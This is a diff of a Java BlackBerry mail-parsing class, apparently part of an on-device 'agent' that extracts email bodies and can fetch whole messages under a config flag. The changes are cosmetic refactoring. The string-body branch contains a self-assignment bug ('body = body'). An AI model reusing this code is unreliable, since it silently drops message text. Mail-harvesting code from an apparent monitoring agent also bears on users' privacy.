@@ -1,12 +1,6 @@
 //#preprocess
 package blackberry.agent.mail;
 
-import blackberry.Conf;
-import blackberry.utils.Check;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
-import blackberry.utils.StringPair;
-import net.rim.blackberry.api.mail.BodyPart;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MimeBodyPart;
 import net.rim.blackberry.api.mail.Multipart;
@@ -15,21 +9,25 @@ import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
 import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
 import net.rim.blackberry.api.mail.BodyPart.ContentType;
+import blackberry.Conf;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public class MailParser {
     //#ifdef DEBUG
     static Debug debug = new Debug("MailParser", DebugLevel.VERBOSE);
     //#endif
 
-    private Message message;
-    private Mail mail;
+    private final Message message;
+    private final Mail mail;
 
     public MailParser(final Message message) {
         this.message = message;
         mail = new Mail();
     }
 
-    public Mail parse() {
+    public final Mail parse() {
         //#ifdef DBC
         Check.requires(message != null, "parse: message != null");
         //#endif
@@ -38,20 +36,20 @@ public class MailParser {
         return mail;
     }
 
-    private void findEmailBody(Object obj) {
+    private void findEmailBody(final Object obj) {
         //Reset the attachment flags.
         mail.hasSupportedAttachment = false;
         mail.hasUnsupportedAttachment = false;
         if (obj instanceof Multipart) {
-            Multipart mp = (Multipart) obj;
+            final Multipart mp = (Multipart) obj;
             for (int count = 0; count < mp.getCount(); ++count) {
                 findEmailBody(mp.getBodyPart(count));
             }
         } else if (obj instanceof TextBodyPart) {
-            TextBodyPart tbp = (TextBodyPart) obj;
+            final TextBodyPart tbp = (TextBodyPart) obj;
             readEmailBody(tbp);
         } else if (obj instanceof MimeBodyPart) {
-            MimeBodyPart mbp = (MimeBodyPart) obj;
+            final MimeBodyPart mbp = (MimeBodyPart) obj;
             if (mbp.getContentType().indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
                 readEmailBody(mbp);
             }
@@ -76,13 +74,13 @@ public class MailParser {
      * 
      * @param mbp
      */
-    private void readEmailBody(MimeBodyPart mbp) {
+    private void readEmailBody(final MimeBodyPart mbp) {
         //Extract the content of the message.
-        Object obj = mbp.getContent();
-        String mimeType = mbp.getContentType();
+        final Object obj = mbp.getContent();
+        final String mimeType = mbp.getContentType();
         String body = null;
         if (obj instanceof String) {
-            body = (String) body;
+            body = body;
         } else if (obj instanceof byte[]) {
             body = new String((byte[]) obj);
         }
@@ -95,9 +93,9 @@ public class MailParser {
                     debug.info("There's more text: " + Conf.FETCH_WHOLE_EMAIL);
                     //#endif
                     if (Conf.FETCH_WHOLE_EMAIL) {
-                        Transport.more((BodyPart) mbp, true);
+                        Transport.more(mbp, true);
                     }
-                } catch (Exception ex) {
+                } catch (final Exception ex) {
                     //#ifdef DEBUG_ERROR
                     debug.error("readEmailBody Mime Text: " + ex);
                     //#endif
@@ -112,9 +110,9 @@ public class MailParser {
                     debug.info("There's more html: " + Conf.FETCH_WHOLE_EMAIL);
                     //#endif
                     if (Conf.FETCH_WHOLE_EMAIL) {
-                        Transport.more((BodyPart) mbp, true);
+                        Transport.more(mbp, true);
                     }
-                } catch (Exception ex) {
+                } catch (final Exception ex) {
                     //#ifdef DEBUG_ERROR
                     debug.error("readEmailBody Mime Html: " + ex);
                     //#endif
@@ -128,12 +126,12 @@ public class MailParser {
      * 
      * @param tbp
      */
-    private void readEmailBody(TextBodyPart tbp) {
+    private void readEmailBody(final TextBodyPart tbp) {
         mail.plainTextMessage = (String) tbp.getContent();
         if (tbp.hasMore() && !tbp.moreRequestSent()) {
             try {
-                Transport.more((BodyPart) tbp, true);
-            } catch (Exception ex) {
+                Transport.more(tbp, true);
+            } catch (final Exception ex) {
                 //#ifdef DEBUG_ERROR
                 debug.error("readEmailBody Text: " + ex);
                 //#endif
